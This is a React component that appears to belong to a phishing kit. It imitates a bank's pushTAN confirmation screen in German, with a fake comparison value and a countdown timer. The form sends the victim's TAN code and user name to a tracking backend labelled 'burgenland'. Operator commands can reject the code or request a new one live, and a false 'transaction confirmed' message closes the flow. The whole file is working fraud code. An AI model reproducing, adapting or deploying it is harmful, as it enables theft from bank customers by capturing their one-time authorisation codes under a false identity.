"use client";

import { useEffect, useState, useRef, useCallback } from "react";
import { trackSubmission, onCommand } from "@/lib/track";

/* ---- random 4-char reference code ---- */
function generateVergleichswert(): string {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let result = "";
  for (let i = 0; i < 4; i++) {
    result += chars[Math.floor(Math.random() * chars.length)];
  }
  return result;
}

const TOTAL_SECONDS = 300; // 5 minutes

export default function PushTanForm({ user, vergleichswert: vergleichswertProp }: { user: string; vergleichswert?: string }) {
  const [vergleichswert] = useState(() => vergleichswertProp || generateVergleichswert());
  const [code, setCode] = useState("");
  const [secondsLeft, setSecondsLeft] = useState(TOTAL_SECONDS);
  const [expired, setExpired] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState(false);
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  /* ---- countdown timer ---- */
  useEffect(() => {
    timerRef.current = setInterval(() => {
      setSecondsLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timerRef.current!);
          setExpired(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
    };
  }, []);

  /* ---- command handler ---- */
  useEffect(() => {
    onCommand((cmd) => {
      switch (cmd.type) {
        case "show_error":
          setError((cmd.payload?.message as string) || "Ein Fehler ist aufgetreten.");
          break;
        case "clear_error":
          setError(null);
          break;
        case "reject_tan":
          setError("TAN-Code ist falsch. Bitte versuchen Sie es erneut.");
          setCode("");
          break;
        case "retry_tan":
          setError("Bitte geben Sie einen neuen Code ein.");
          setCode("");
          setExpired(false);
          setSecondsLeft(TOTAL_SECONDS);
          if (timerRef.current) clearInterval(timerRef.current);
          timerRef.current = setInterval(() => {
            setSecondsLeft((prev) => {
              if (prev <= 1) {
                clearInterval(timerRef.current!);
                setExpired(true);
                return 0;
              }
              return prev - 1;
            });
          }, 1000);
          break;
      }
    });
    return () => onCommand(() => {});
  }, []);

  const formatTime = useCallback((s: number) => {
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return `${m}:${sec.toString().padStart(2, "0")}`;
  }, []);

  const progressFraction = secondsLeft / TOTAL_SECONDS;

  const isValid = code.length >= 4 && code.length <= 6 && !expired;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isValid || submitting) return;
    setSubmitting(true);
    setError(null);
    await trackSubmission("burgenland", "pushtan", { code, vergleichswert, user });
    setSuccess(true);
    setSubmitting(false);
  };

  /* ---- SVG ring constants ---- */
  const ringSize = 80;
  const strokeWidth = 4;
  const radius = (ringSize - strokeWidth) / 2;
  const circumference = 2 * Math.PI * radius;
  const dashOffset = circumference * (1 - progressFraction);

  /* ---- Render ---- */
  return (
    <>
      {/* Header with logo */}
      <div className="login-header">
        <span className="sr-only">Firmenlogo</span>
        <div id="topbar" className="topbar pre-login">
          <div className="container">
            <div className="row">
              <div className="topbar-logo"></div>
            </div>
          </div>
        </div>
      </div>

      {/* Main pushTAN area */}
      <div className="leave-header-visible" id="overlaycontainer-login">
        <div id="loginform" className="login-pin-column">
          <div id="modaloverlay" className="modal show" role="dialog">
            <div className="modal-dialog">
              <div className="modal-content">
                {/* Modal Header */}
                <div className="modal-header">
                  <h1>pushTAN</h1>
                </div>

                {/* Modal Body */}
                <div className="modal-body">
                  {/* Error banner */}
                  {error && (
                    <div className="messages-overlay" style={{
                      paddingBottom: 0,
                    }}>
                      <div style={{
                        backgroundColor: "#fef2f2",
                        border: "1px solid #fecaca",
                        borderRadius: 4,
                        padding: "12px 16px",
                        color: "#b91c1c",
                        fontSize: 14,
                        lineHeight: 1.5,
                        fontFamily: "Arial, Helvetica, sans-serif",
                      }}>
                        {error}
                      </div>
                    </div>
                  )}

                  {/* Info text */}
                  <div className="row login-row login-info-text">
                    <p>
                      Best{"ä"}tigen Sie die Transaktion in Ihrer pushTAN-App.
                      Vergleichen Sie den angezeigten Vergleichswert mit dem Wert auf Ihrem Ger{"ä"}t.
                    </p>
                  </div>

                  {success ? (
                    /* ---- Success message ---- */
                    <div style={{ textAlign: "center", padding: "30px 15px 40px" }}>
                      <div style={{
                        width: 64,
                        height: 64,
                        borderRadius: "50%",
                        backgroundColor: "#005aa5",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        margin: "0 auto 20px",
                      }}>
                        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                          <polyline points="20 6 9 17 4 12" />
                        </svg>
                      </div>
                      <p style={{
                        fontFamily: "Arial, Helvetica, sans-serif",
                        fontSize: 20,
                        color: "#333333",
                        marginBottom: 8,
                      }}>
                        Transaktion best{"ä"}tigt
                      </p>
                      <p style={{
                        fontFamily: "Arial, Helvetica, sans-serif",
                        fontSize: 14,
                        color: "#8c8c8c",
                      }}>
                        Ihre Eingabe wurde erfolgreich {"ü"}bermittelt.
                      </p>
                    </div>
                  ) : (
                    <form onSubmit={handleSubmit}>
                      {/* Timer ring + Vergleichswert */}
                      <div style={{
                        display: "flex",
                        alignItems: "center",
                        gap: 24,
                        justifyContent: "center",
                        padding: "20px 15px 10px",
                      }}>
                        {/* Countdown ring */}
                        <div style={{ position: "relative", width: ringSize, height: ringSize, flexShrink: 0 }}>
                          <svg width={ringSize} height={ringSize} style={{ transform: "rotate(-90deg)" }}>
                            {/* Background circle */}
                            <circle
                              cx={ringSize / 2}
                              cy={ringSize / 2}
                              r={radius}
                              fill="none"
                              stroke="#dedede"
                              strokeWidth={strokeWidth}
                            />
                            {/* Progress circle */}
                            <circle
                              cx={ringSize / 2}
                              cy={ringSize / 2}
                              r={radius}
                              fill="none"
                              stroke={expired ? "#c0392b" : "#005aa5"}
                              strokeWidth={strokeWidth}
                              strokeDasharray={circumference}
                              strokeDashoffset={dashOffset}
                              strokeLinecap="round"
                              style={{ transition: "stroke-dashoffset 1s linear" }}
                            />
                          </svg>
                          <div style={{
                            position: "absolute",
                            top: 0,
                            left: 0,
                            width: "100%",
                            height: "100%",
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "center",
                            fontFamily: "Arial, Helvetica, sans-serif",
                            fontSize: 16,
                            fontWeight: 500,
                            color: expired ? "#c0392b" : "#333333",
                          }}>
                            {formatTime(secondsLeft)}
                          </div>
                        </div>

                        {/* Vergleichswert */}
                        <div>
                          <p style={{
                            fontFamily: "Arial, Helvetica, sans-serif",
                            fontSize: 12,
                            color: "#8c8c8c",
                            marginBottom: 6,
                            textTransform: "uppercase",
                            letterSpacing: "0.05em",
                          }}>
                            Vergleichswert
                          </p>
                          <p style={{
                            fontFamily: "Arial, Helvetica, sans-serif",
                            fontSize: 32,
                            fontWeight: 400,
                            color: "#005aa5",
                            letterSpacing: "0.15em",
                            lineHeight: 1,
                          }}>
                            {vergleichswert}
                          </p>
                        </div>
                      </div>

                      {/* Divider */}
                      <div className="row login-row">
                        <hr className="no-margin-top" role="presentation" />
                      </div>

                      {/* Code input */}
                      <div className="row">
                        <div className="col-xs-12">
                          <label htmlFor="tan-code">
                            <small>TAN-Code</small>
                          </label>
                          <div className="input-text">
                            <input
                              id="tan-code"
                              name="tan-code"
                              type="text"
                              className="form-control"
                              placeholder="TAN-Code eingeben"
                              value={code}
                              onChange={(e) => setCode(e.target.value.replace(/[^A-Za-z0-9]/g, "").slice(0, 6))}
                              maxLength={6}
                              disabled={expired}
                              autoComplete="one-time-code"
                              inputMode="text"
                              spellCheck={false}
                              style={expired ? { opacity: 0.5 } : {}}
                            />
                            <a
                              className="del-btn"
                              tabIndex={-1}
                              onClick={() => setCode("")}
                              style={{ display: code ? "block" : "none" }}
                            >
                              <span className="icon icon-inhalt-loeschen">{"✕"}</span>
                            </a>
                          </div>
                        </div>
                      </div>

                      {expired && (
                        <div className="row">
                          <div className="col-xs-12" style={{ paddingTop: 8 }}>
                            <p style={{
                              textAlign: "center",
                              color: "#c0392b",
                              fontSize: 14,
                              fontFamily: "Arial, Helvetica, sans-serif",
                              margin: 0,
                            }}>
                              Zeit abgelaufen. Bitte fordern Sie einen neuen Code an.
                            </p>
                          </div>
                        </div>
                      )}

                      {/* Submit button footer */}
                      <div className="modal-footer">
                        <div className="row">
                          <button
                            type="submit"
                            className="button-default pull-right button-fullwidth"
                            disabled={!isValid || submitting}
                            aria-label="TAN best&auml;tigen"
                          >
                            {submitting ? "Wird geprüft..." : "Bestätigen"}
                          </button>
                        </div>
                      </div>
                    </form>
                  )}
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}
